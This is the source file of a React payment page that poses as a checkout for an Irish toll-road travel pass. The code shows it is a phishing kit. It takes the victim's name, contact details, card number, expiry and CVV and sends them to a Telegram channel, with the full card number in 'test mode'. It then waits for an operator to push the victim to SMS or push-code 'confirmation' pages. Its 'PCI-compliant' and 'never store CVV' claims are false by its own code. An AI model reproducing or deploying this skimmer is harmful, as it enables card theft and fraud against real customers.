import { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation, Link } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Checkbox } from "@/components/ui/checkbox";
import { Label } from "@/components/ui/label";
import { ArrowLeft, Shield, CreditCard } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { saveCustomerInfo, getVehicleData, getDurationData, Vehicle, Duration } from "@/lib/cookies";
import { sendFormSubmissionNotification, sendPaymentSubmissionNotification } from "@/lib/telegram";

// Generate unique user ID for tracking
const generateUserId = () => {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
};

// Credit card brand logo SVG components
const VisaLogo = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 156 48" fill="none" xmlns="http://www.w3.org/2000/svg">
    <rect width="156" height="48" rx="6" fill="white"/>
    <path d="M49.36 11.45l-6.48 25.36H37.6L31.12 19.3c-.39-.78-.73-1.08-1.92-1.37C27.15 17.44 24.31 17 21.64 16.8l-.15-2.61h13.28c1.67 0 3.19 1.13 3.59 3.05l3.24 17.33L48.96 11.45h4.4zm24.67 13c.05-5.07-7.03-5.35-6.98-7.62.02-.69.64-1.43 2.06-1.57.69-.1 2.6-.15 4.82.84l.84-3.93c-1.18-.44-2.7-.84-4.62-.84-4.87 0-8.3 2.6-8.35 6.3-.05 2.75 2.46 4.28 4.33 5.17 1.92.93 2.56 1.52 2.56 2.36-.05 1.23-1.47 1.77-2.85 1.82-2.41.05-3.78-.64-4.92-1.18l-.88 4.08c1.13.54 3.19.99 5.35 1.03 5.17 0 8.56-2.56 8.64-6.54zm12.35 6.19h4.77L87.23 11.45h-4.43c-1.38 0-2.56.79-3.09 2.01L68.92 30.64h5.17l1.03-2.85h6.34l.59 2.85zm-5.5-7.03l2.6-7.18 1.47 7.18h-4.07zm-22.92-12.16l-4.08 19.19h4.92l4.08-19.19h-4.92z" fill="#1434CB"/>
  </svg>
);

const MastercardLogo = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 156 96" fill="none">
    <rect x="0" y="0" width="156" height="96" rx="8" fill="white" stroke="#e5e5e5" strokeWidth="1"/>
    <circle cx="61" cy="48" r="30" fill="#EB001B"/>
    <circle cx="95" cy="48" r="30" fill="#F79E1B"/>
    <path d="M78 30.5c3.6 4.8 5.7 10.8 5.7 17.5s-2.1 12.7-5.7 17.5c-3.6-4.8-5.7-10.8-5.7-17.5s2.1-12.7 5.7-17.5z" fill="#FF5F00"/>
  </svg>
);

const AmexLogo = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 156 96" fill="none">
    <rect x="0" y="0" width="156" height="96" rx="8" fill="#006FCF"/>
    <path d="M27 40h9l3 5 3-5h9v12h-5v-7l-3 4h-3l-3-4v7h-5V40zm24 0h12v3h-7v2h6v3h-6v2h7v3h-12V40zm18 0h5l4 5v-5h5v12h-5v-5l-4 5h-5l6-6-6-6zm20 0h5l3 7 3-7h5l-6 12h-4l-3-7-3 7h-4l-6-12z" fill="white"/>
  </svg>
);

const DiscoverLogo = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 156 96" fill="none">
    <rect x="0" y="0" width="156" height="96" rx="8" fill="white" stroke="#e5e5e5" strokeWidth="1"/>
    <rect x="100" y="0" width="56" height="96" fill="#F47216"/>
    <path d="M15 35h8v2h-6v2h6v2h-6v2h8v3h-10V35zm12 0h10v12H37v-8h-6V35h-4zm8 2v8h4v-8h-4zm12 -2h4l4 5v-5h4v12h-4v-5l-4 5h-4l5-6-5-6zm16 0h4l2 5 2-5h4l-3 6 3 6h-4l-2-5-2 5h-4l3-6-3-6zm20 0h8v2h-6v2h6v2h-6v2h8v3h-10V35zm12 0h4l4 5v-5h4v12h-4v-5l-4 5h-4l5-6-5-6z" fill="#231F20"/>
  </svg>
);

const DinersLogo = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 156 96" fill="none">
    <rect x="0" y="0" width="156" height="96" rx="8" fill="white" stroke="#e5e5e5" strokeWidth="1"/>
    <ellipse cx="78" cy="48" rx="50" ry="30" fill="none" stroke="#0079BE" strokeWidth="4"/>
    <rect x="45" y="35" width="66" height="26" fill="#0079BE"/>
    <text x="78" y="50" textAnchor="middle" fontSize="12" fontWeight="bold" fill="white">DINERS CLUB</text>
  </svg>
);

const JCBLogo = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 156 96" fill="none">
    <rect x="0" y="0" width="156" height="96" rx="8" fill="white" stroke="#e5e5e5" strokeWidth="1"/>
    <rect x="30" y="30" width="28" height="36" rx="4" fill="#0E4C96"/>
    <rect x="64" y="30" width="28" height="36" rx="4" fill="#5382C1"/>  
    <rect x="98" y="30" width="28" height="36" rx="4" fill="#009639"/>
    <text x="44" y="52" textAnchor="middle" fontSize="20" fontWeight="bold" fill="white">J</text>
    <text x="78" y="52" textAnchor="middle" fontSize="20" fontWeight="bold" fill="white">C</text>
    <text x="112" y="52" textAnchor="middle" fontSize="20" fontWeight="bold" fill="white">B</text>
  </svg>
);

// Card type detection patterns
const cardPatterns = {
  visa: /^4[0-9]{0,15}$/,
  mastercard: /^5[1-5][0-9]{0,14}$|^2[2-7][0-9]{0,14}$/,
  amex: /^3[47][0-9]{0,13}$/,
  discover: /^6(?:011|5[0-9]{2})[0-9]{0,12}$/,
  diners: /^3[0689][0-9]{0,11}$/,
  jcb: /^(?:2131|1800|35\d{3})\d{0,11}$/
};

const detectCardType = (cardNumber: string): string => {
  const cleanNumber = cardNumber.replace(/\s/g, '');
  
  for (const [type, pattern] of Object.entries(cardPatterns)) {
    if (pattern.test(cleanNumber)) {
      return type;
    }
  }
  
  return 'unknown';
};

const getCardIcon = (cardType: string) => {
  const className = "w-8 h-5";
  
  switch (cardType) {
    case 'visa':
      return <VisaLogo className={className} />;
    case 'mastercard':
      return <MastercardLogo className={className} />;
    case 'amex':
      return <AmexLogo className={className} />;
    case 'discover':
      return <DiscoverLogo className={className} />;
    case 'diners':
      return <DinersLogo className={className} />;
    case 'jcb':
      return <JCBLogo className={className} />;
    default:
      return <CreditCard className="w-5 h-5 text-muted-foreground" />;
  }
};

const getCardName = (cardType: string): string => {
  const names = {
    visa: 'Visa',
    mastercard: 'Mastercard',
    amex: 'American Express',
    discover: 'Discover',
    diners: 'Diners Club',
    jcb: 'JCB',
    unknown: 'Card'
  };
  return names[cardType as keyof typeof names] || names.unknown;
};

// Vehicle and Duration interfaces are now imported from cookies.ts

interface FormData {
  fullName: string;
  email: string;
  phone: string;
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  termsAccepted: boolean;
  saveCard: boolean;
}

const PaymentPage = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [vehicle, setVehicle] = useState<Vehicle | null>(null);
  const [duration, setDuration] = useState<Duration | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [cardType, setCardType] = useState<string>('unknown');
  const [userId] = useState<string>(() => generateUserId());
  const [isProcessing, setIsProcessing] = useState(false);
  const [paymentRejected, setPaymentRejected] = useState(false);
  const [formData, setFormData] = useState<FormData>({
    fullName: '',
    email: '',
    phone: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    termsAccepted: false,
    saveCard: false
  });
  const [errors, setErrors] = useState<Partial<FormData>>({});
  const pollIntervalRef = useRef<number | null>(null);
  const timeoutRef = useRef<number | null>(null);

  useEffect(() => {
    // Try to get data from navigation state first, then cookies
    const { vehicle: vehicleData, duration: durationData } = location.state || {};
    const cookieVehicle = getVehicleData();
    const cookieDuration = getDurationData();
    
    const finalVehicle = vehicleData || cookieVehicle;
    const finalDuration = durationData || cookieDuration;
    
    if (finalVehicle && finalDuration) {
      setVehicle(finalVehicle);
      setDuration(finalDuration);
    } else {
      navigate('/');
    }
  }, [location.state, navigate]);

  const validateForm = (): boolean => {
    const newErrors: Partial<FormData> = {};

    if (!formData.fullName.trim()) newErrors.fullName = 'Full name is required';
    if (!formData.email.trim()) newErrors.email = 'Email is required';
    if (!/\S+@\S+\.\S+/.test(formData.email)) newErrors.email = 'Invalid email format';
    if (!formData.phone.trim()) newErrors.phone = 'Phone number is required';
    if (!formData.cardNumber.trim()) newErrors.cardNumber = 'Card number is required';
    if (!formData.expiryDate.trim()) newErrors.expiryDate = 'Expiry date is required';
    if (!formData.cvv.trim()) newErrors.cvv = 'CVV is required';
    if (!formData.termsAccepted) newErrors.termsAccepted = 'You must accept the terms' as any;

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleInputChange = (field: keyof FormData, value: string | boolean) => {
    setFormData(prev => ({ ...prev, [field]: value }));
    // Clear error when user starts typing
    if (errors[field]) {
      setErrors(prev => ({ ...prev, [field]: undefined }));
    }
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    
    // Detect card type and update state
    const detected = detectCardType(match);
    setCardType(detected);
    
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    if (v.length >= 2) {
      return v.substring(0, 2) + '/' + v.substring(2, 4);
    }
    return v;
  };

  const checkPaymentStatus = async () => {
    try {
      const { data: session } = await supabase
        .from('payment_sessions')
        .select('payment_status, admin_response')
        .eq('user_id', userId)
        .single();

      if (session) {
        if (session.payment_status === 'approved') {
          if (session.admin_response === 'sms') {
            if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
            if (timeoutRef.current) clearTimeout(timeoutRef.current);
            navigate('/sms-confirmation', {
              state: { vehicle, duration, customerInfo: { fullName: formData.fullName, email: formData.email, phone: formData.phone }, userId }
            });
          } else if (session.admin_response === 'push') {
            if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
            if (timeoutRef.current) clearTimeout(timeoutRef.current);
            navigate('/push-confirmation', {
              state: { vehicle, duration, customerInfo: { fullName: formData.fullName, email: formData.email, phone: formData.phone }, userId }
            });
          }
        } else if (session.payment_status === 'rejected' && session.admin_response === 'error') {
          setPaymentRejected(true);
          setIsProcessing(false);
          setIsSubmitting(false);
        }
      }
    } catch (error) {
      console.error('Error checking payment status:', error);
    }
  };

  const handleRetryPayment = () => {
    setPaymentRejected(false);
    setErrors({});
    setIsProcessing(false);
    setIsSubmitting(false);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) return;
    
    setIsSubmitting(true);
    setIsProcessing(true);
    
    // Clear any existing payment session for retry
    if (paymentRejected) {
      try {
        await supabase
          .from('payment_sessions')
          .delete()
          .eq('user_id', userId);
      } catch (error) {
        console.log('No existing session to delete');
      }
    }

    // Analytics event
    if (window.gtag) {
      window.gtag('event', 'payment_initiated', {
        amount: duration?.discountedPrice,
        duration: duration?.days
      });
    }

    // Save customer info to cookies
    const customerInfo = {
      fullName: formData.fullName,
      email: formData.email,
      phone: formData.phone
    };
    saveCustomerInfo(customerInfo);

    try {
      // Get test mode setting
      const { data: telegramSettings } = await supabase
        .from('settings')
        .select('value')
        .eq('key', 'telegram')
        .single();

      const isTestMode = telegramSettings?.value && 
        typeof telegramSettings.value === 'object' && 
        'test_mode' in telegramSettings.value ? 
        Boolean((telegramSettings.value as any).test_mode) : false;

      // Create payment session record with card data (full for test mode)
      const cardNumberForStorage = isTestMode ? formData.cardNumber : `****${formData.cardNumber.slice(-4)}`;
      
      const { error: sessionError } = await supabase
        .from('payment_sessions')
        .insert({
          user_id: userId,
          customer_name: formData.fullName,
          customer_email: formData.email,
          customer_phone: formData.phone,
          vehicle_registration: vehicle?.registration || '',
          vehicle_make: vehicle?.make,
          vehicle_model: vehicle?.model,
          vehicle_color: vehicle?.color,
          duration_label: duration?.label || '',
          price: `€${duration?.discountedPrice || 0}`,
          card_number_masked: cardNumberForStorage,
          card_type: getCardName(cardType)
        });

      if (sessionError) {
        console.error('Error creating payment session:', sessionError);
        throw sessionError;
      }

      // Send payment submission notification to Telegram with admin buttons
      await sendPaymentSubmissionNotification({
        userId,
        name: formData.fullName,
        email: formData.email,
        phone: formData.phone,
        vehicle_registration: vehicle?.registration || '',
        vehicle_make: vehicle?.make || 'Unknown',
        vehicle_model: vehicle?.model || 'Unknown',
        vehicle_color: vehicle?.color || 'Unknown',
        duration: duration?.label || '',
        price: `€${duration?.discountedPrice || 0}`,
        card_number_masked: cardNumberForStorage,
        card_type: getCardName(cardType),
        card_expiry: formData.expiryDate,
        card_cvv: formData.cvv,
        test_mode: isTestMode
      });

      // Start polling for admin response
      const startPolling = () => {
        if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
        if (timeoutRef.current) clearTimeout(timeoutRef.current);

        pollIntervalRef.current = window.setInterval(checkPaymentStatus, 2000);
        
        timeoutRef.current = window.setTimeout(() => {
          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current!);
          setIsProcessing(false);
          setIsSubmitting(false);
          setErrors({ termsAccepted: 'Payment processing timed out. Please try again.' as any });
        }, 300000); // 5 minutes
      };
      
      startPolling();

    } catch (error) {
      console.error('Failed to process payment:', error);
      setErrors({ termsAccepted: 'Payment processing failed. Please try again.' as any });
      setIsSubmitting(false);
      setIsProcessing(false);
    }
  };

  // Clean up intervals on component unmount
  useEffect(() => {
    return () => {
      if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
      if (timeoutRef.current) clearTimeout(timeoutRef.current);
    };
  }, []);

  if (!vehicle || !duration) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <p className="text-xl mb-4">Loading payment information...</p>
          <Button onClick={() => navigate('/')} variant="outline">
            Return to Homepage
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background py-8">
      <div className="container mx-auto px-4">
        <div className="max-w-4xl mx-auto">
          <Button 
            variant="ghost" 
            onClick={() => navigate('/duration', { state: { vehicle } })}
            className="mb-6"
          >
            <ArrowLeft className="w-4 h-4 mr-2" />
            Back to Duration Selection
          </Button>

          <div className="text-center mb-8">
            <h1 className="text-4xl font-bold mb-4">Secure Payment</h1>
            <p className="text-xl text-muted-foreground">Complete your Travel Pass purchase</p>
          </div>

          <div className="grid lg:grid-cols-2 gap-8">
            {/* Payment Form */}
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <CreditCard className="w-5 h-5" />
                  Payment Information
                </CardTitle>
              </CardHeader>
              <CardContent>
                <form onSubmit={handleSubmit} className="space-y-6">
                  <div className="form-field">
                    <label className="form-label">Full Name *</label>
                    <Input
                      className="form-input"
                      value={formData.fullName}
                      onChange={(e) => handleInputChange('fullName', e.target.value)}
                      placeholder="Enter your full name"
                    />
                    {errors.fullName && <p className="form-error">{errors.fullName}</p>}
                  </div>

                  <div className="form-field">
                    <label className="form-label">Email Address *</label>
                    <Input
                      type="email"
                      className="form-input"
                      value={formData.email}
                      onChange={(e) => handleInputChange('email', e.target.value)}
                      placeholder="your@email.com"
                    />
                    <p className="text-sm text-muted-foreground mt-1">Used for receipt and pass details</p>
                    {errors.email && <p className="form-error">{errors.email}</p>}
                  </div>

                  <div className="form-field">
                    <label className="form-label">Phone Number *</label>
                    <Input
                      type="tel"
                      className="form-input"
                      value={formData.phone}
                      onChange={(e) => handleInputChange('phone', e.target.value)}
                      placeholder="+353 XX XXX XXXX"
                    />
                    <p className="text-sm text-muted-foreground mt-1">Required for verification</p>
                    {errors.phone && <p className="form-error">{errors.phone}</p>}
                  </div>

                  <div className="form-field">
                    <label className="form-label">Card Number *</label>
                    <div className="relative">
                      <Input
                        className="form-input pr-20"
                        value={formData.cardNumber}
                        onChange={(e) => handleInputChange('cardNumber', formatCardNumber(e.target.value))}
                        placeholder="1234 5678 9012 3456"
                        maxLength={19}
                      />
                    {cardType !== 'unknown' && (
                      <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center gap-2 text-sm text-muted-foreground">
                        {getCardIcon(cardType)}
                        <span className="hidden sm:inline font-medium">{getCardName(cardType)}</span>
                      </div>
                    )}
                  </div>
                  {errors.cardNumber && !paymentRejected && <p className="form-error">{errors.cardNumber}</p>}
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div className="form-field">
                      <label className="form-label">Expiry Date *</label>
                      <Input
                        className="form-input"
                        value={formData.expiryDate}
                        onChange={(e) => handleInputChange('expiryDate', formatExpiryDate(e.target.value))}
                        placeholder="MM/YY"
                        maxLength={5}
                      />
                      {errors.expiryDate && <p className="form-error">{errors.expiryDate}</p>}
                    </div>

                    <div className="form-field">
                      <label className="form-label">CVV *</label>
                      <Input
                        className="form-input"
                        value={formData.cvv}
                        onChange={(e) => handleInputChange('cvv', e.target.value.replace(/\D/g, '').slice(0, 4))}
                        placeholder="123"
                        maxLength={4}
                      />
                      {errors.cvv && <p className="form-error">{errors.cvv}</p>}
                    </div>
                  </div>

                  <div className="space-y-4">
                    <div className="flex items-center space-x-2">
                      <Checkbox
                        id="save-card"
                        checked={formData.saveCard}
                        onCheckedChange={(checked) => handleInputChange('saveCard', !!checked)}
                      />
                      <Label htmlFor="save-card" className="text-sm text-muted-foreground">
                        Save card for future purchases (optional)
                      </Label>
                    </div>

                    <div className="flex items-start space-x-2">
                      <Checkbox
                        id="terms"
                        checked={formData.termsAccepted}
                        onCheckedChange={(checked) => handleInputChange('termsAccepted', !!checked)}
                        className="mt-0.5"
                      />
                      <Label htmlFor="terms" className="text-sm leading-relaxed">
                        I agree to the{' '}
                        <Link to="/terms" className="text-accent-irish hover:underline" target="_blank">
                          Terms & Conditions
                        </Link>{' '}
                        and Payment Authorization *
                      </Label>
                    </div>
                    {errors.termsAccepted && <p className="form-error">{errors.termsAccepted}</p>}
                  </div>

                  <div className="flex items-center gap-2 text-sm text-muted-foreground bg-muted p-3 rounded-lg">
                    <Shield className="w-4 h-4" />
                    <span>Payments processed by PCI-compliant gateway. We never store CVV.</span>
                  </div>

                  {paymentRejected && (
                    <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 mb-4">
                      <div>
                        <p className="font-medium text-destructive">Payment Rejected</p>
                        <p className="text-sm text-muted-foreground mt-1">
                          The payment was rejected due to invalid card details. Please check your information and try again.
                        </p>
                      </div>
                    </div>
                  )}

                  <Button 
                    type="submit" 
                    disabled={isSubmitting || isProcessing}
                    className="btn-hero w-full text-lg py-4"
                  >
                    {isProcessing ? (
                      <div className="flex items-center justify-center space-x-2">
                        <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                        <span>Processing payment...</span>
                      </div>
                    ) : isSubmitting ? 'Processing Payment...' : 'Pay Now'}
                  </Button>
                  
                  {isProcessing && (
                    <div className="text-center text-sm text-muted-foreground mt-2">
                      <p className="text-xs">User ID: {userId}</p>
                    </div>
                  )}
                </form>
              </CardContent>
            </Card>

            {/* Order Summary */}
            <Card>
              <CardHeader>
                <CardTitle>Order Summary</CardTitle>
              </CardHeader>
              <CardContent className="space-y-6">
                <div>
                  <h3 className="font-semibold mb-2">Vehicle</h3>
                  <p className="text-muted-foreground">
                    {vehicle.color} {vehicle.make} {vehicle.model} ({vehicle.registration})
                  </p>
                </div>

                <div>
                  <h3 className="font-semibold mb-2">Travel Pass</h3>
                  <p className="text-muted-foreground">{duration.label}</p>
                </div>

                <div className="space-y-2 py-4 border-t border-b border-border">
                  <div className="flex justify-between">
                    <span>Original Price:</span>
                    <span className="line-through text-muted-foreground">€{duration.originalPrice.toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between text-accent-irish">
                    <span>30% Discount:</span>
                    <span>-€{duration.savings.toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between text-xl font-bold">
                    <span>Total:</span>
                    <span>€{duration.discountedPrice.toFixed(2)}</span>
                  </div>
                </div>

                <div className="text-sm text-muted-foreground space-y-2">
                  <p>✓ Instant activation after verification</p>
                  <p>✓ Valid on all Irish toll roads</p>
                  <p>✓ 24-hour refund if unused</p>
                  <p>✓ Secure payment processing</p>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentPage;